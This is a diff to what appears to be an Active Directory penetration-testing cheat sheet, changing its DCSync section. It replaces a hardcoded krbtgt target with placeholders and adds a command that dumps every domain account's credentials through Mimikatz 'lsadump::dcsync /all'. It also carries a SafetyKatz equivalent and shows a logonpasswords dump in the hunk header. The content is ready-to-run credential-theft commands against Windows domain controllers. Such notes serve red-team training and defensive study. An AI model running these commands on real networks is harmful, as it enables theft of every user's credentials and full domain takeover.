@@ -217,14 +217,19 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 ## DC Sync
 - Extract creds from the DC without code execution using DA privileges.
 
-#### Mimikatz DCSync attack
+#### Mimikatz DCSync attack specific user
 ```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\<USER>"'
+```
+
+#### Mimikatz DCSync attack everything
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
 ```
 
 #### Safetykatz.exe
 ```
-SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN>\<USER>" "exit"
 ```
 
 ## Token manipulation
